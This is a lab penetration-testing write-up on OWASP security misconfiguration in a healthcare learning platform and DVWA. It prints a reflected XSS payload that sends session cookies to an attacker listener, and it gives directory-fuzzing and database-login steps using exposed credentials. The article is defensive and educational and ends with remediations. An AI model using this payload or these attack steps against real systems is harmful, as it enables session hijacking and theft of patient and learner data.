Security Misconfiguration in the HealthLearn Platform: Investigating and Mitigating OWASP A02:2025
Author: Ajibawo, Oladipo Oluyemisi

Date: 2026

Overview
This article assesses the HealthLearn healthcare education platform for OWASP A02:2025 Security Misconfiguration vulnerabilities through a structured penetration testing methodology. Two attack chains are demonstrated end-to-end in a controlled QEMU-based lab environment: database credential exposure via a plaintext configuration file (CWE-260) and session hijacking via missing cookie flags exploited through reflected XSS (CWE-1004/CWE-614). Healthcare-specific impact is assessed and actionable remediations are provided.

Table of Contents
·	Lab Environment
·	OWASP A02:2025 Overview
·	CWE Taxonomy
·	Simulation 1: CWE-260 — Password in Configuration File
·	Simulation 2: CWE-1004 / CWE-614 — Cookie Flags and XSS
·	Recommendations
·	Key Findings
·	References

Lab Environment
Component	Detail
Hypervisor	QEMU/KVM managed via virt-manager
Target Server	Ubuntu with HealthLearn and DVWA installed
Target IP	192.168.100.173 (HealthLearn), 192.168.100.208 (DVWA)
Attacker Workstation	Kali Linux VM
Tools Used	ffuf, Firefox DevTools, MySQL client, Python HTTP server, Burp Suite


OWASP A02:2025 Overview
Security Misconfiguration (A02:2025) covers weaknesses arising from insecure defaults, missing hardening, excessive permissions, unnecessary services, and exposed diagnostics. In the 2025 dataset, 100% of tested applications exhibited some form of misconfiguration, with over 719,000 mapped CWE instances across 16 CWEs in this category.
Elevation from A05:2021 to A02:2025 reflects evidence that misconfiguration underpins many other vulnerability categories, enabling exploitation of access controls and cryptographic failures.

CWE Taxonomy
CWE	Name	Attack Vector	Simulated
CWE-16	Configuration	Exploit unpatched services	No
CWE-1393	Default Password	Credential stuffing	No
CWE-260	Password in Config File	Read DB credentials from web-accessible file	Yes
CWE-1004	Missing HttpOnly Flag	XSS steals session cookie	Yes
CWE-614	Missing Secure Attribute	MitM intercepts cookie over plain HTTP	Yes
CWE-611	XXE Reference	SSRF or internal file read	No
CWE-693	Protection Mechanism Failure	Missing security headers	No


Simulation 1: CWE-260
Attack Chain
ffuf directory enumeration
  → /backup directory with Apache directory listing enabled
  → config.yml exposed containing plaintext credentials
  → mysql -h 192.168.100.173 -u healthuser -p
  → Full read-write access to healthlearn_db

Attack Steps
1.	ffuf -u http://192.168.100.173/FUZZ -w /usr/share/wordlists/dirb/common.txt discovers /backup
2.	Apache directory listing exposes config.yml
3.	File contains db_user: healthuser, db_password: HealthPass123!
4.	Direct MySQL login: mysql -h 192.168.100.173 -u healthuser -p healthlearn_db --ssl-verify-server-cert=false
5.	Attacker creates table and inserts arbitrary data, demonstrating full read-write control
Impact
Dimension	Risk
Patient/Learner Confidentiality	Bulk extraction of all stored personal data bypassing application access controls
Service Integrity	Tamper with grades, assessments, course content
Regulatory Compliance	Conflicts with secure-configuration requirements under GDPR and healthcare data standards
Institutional Liability	Inadequate secrets management increases liability for negligence and regulatory penalties


Simulation 2: CWE-1004 / CWE-614
Attack Chain
DVWA login → Firefox DevTools confirms HttpOnly=false, Secure=false
  → Reflected XSS payload: "><img src="http://<kali>:8000/?c="+document.cookie>
  → Python HTTP server on Kali captures PHPSESSID in GET request
  → Second browser replaces its PHPSESSID with stolen value
  → Full session hijack without credentials

Attack Steps
1.	Authenticate to DVWA; confirm PHPSESSID with HttpOnly=false, Secure=false in DevTools
2.	Submit XSS payload in reflected XSS input: cookie exfiltrated to attacker's Python HTTP server
3.	Attacker copies PHPSESSID from server log
4.	Second browser inserts stolen PHPSESSID via DevTools Storage editor
5.	DVWA home page loads as victim — full account takeover confirmed
Impact
Dimension	Risk
Patient/Learner Confidentiality	Clinician/lecturer sessions expose assessment outcomes and patient case data
Service Integrity	Attacker alters grades, materials, or assessment records
Regulatory Compliance	Reportable incident under UK GDPR; breach of access control obligations
Institutional Liability	Failure to configure secure cookie flags increases liability in regulatory investigations


Recommendations
Area	Control	Effectiveness	Cost
Cookie Security (CWE-1004/CWE-614)	Enforce Secure, HttpOnly, SameSite on all session cookies at framework level; full-site HTTPS; XSS prevention (CSP, output encoding)	Strongly reduces session hijack risk	Low (single config change)
Secrets Management (CWE-260)	Move DB credentials to a central secrets manager; consume via environment variables or short-lived tokens; least-privilege DB accounts	Directly removes CWE-260 exposure	Medium upfront; low ongoing

Overall recommendation for HealthLearn: Framework-level secure cookie policies + centralised secrets management + configuration-as-code baselines provides the best balance of security, cost, and operability for a healthcare platform.

Key Findings
·	HealthLearn's Apache server had directory listing enabled on the /backup path, exposing config.yml
·	config.yml contained plaintext database credentials in a web-reachable location (CWE-260)
·	DVWA's PHPSESSID cookie had both HttpOnly and Secure set to false (CWE-1004/CWE-614)
·	A single reflected XSS payload was sufficient to exfiltrate the session token to a Python HTTP listener
·	Session hijacking was confirmed by replaying the stolen cookie in a second browser without entering credentials
·	Both attack chains demonstrate that minor configuration oversights escalate into full system compromise

References
·	Al-Aasar, A. et al. (2023). Exploring cookies vulnerabilities. International Journal of Electrical and Computer Engineering, 13(5).
·	Chen, S. et al. (2023). A comprehensive study towards the security of web cookies. Preprint.
·	Dhingra, S. (2025). OWASP Security Misconfiguration: Quick guide. Security Boulevard.
·	MITRE (2025). CWE-1437: OWASP Top Ten 2025 Category A02. https://cwe.mitre.org
·	NIST (2024). CVE-2023-2790 Detail. National Vulnerability Database.
·	OWASP Top 10:2025 (2025). https://owasp.org/Top10/2025/
·	Rasaii, A. et al. (2023). Exploring the cookieverse: a multi-perspective analysis of web cookies. Springer.
·	Smith, T. (2023). Risk Fact #4: Misconfigurations Still Prevalent in Web Applications. Qualys.
·	Wang, T. and Hou, T. (2015). Towards browser controls to protect cookies from cross-site attacks. arXiv.

Ajibawo, Oladipo Oluyemisi

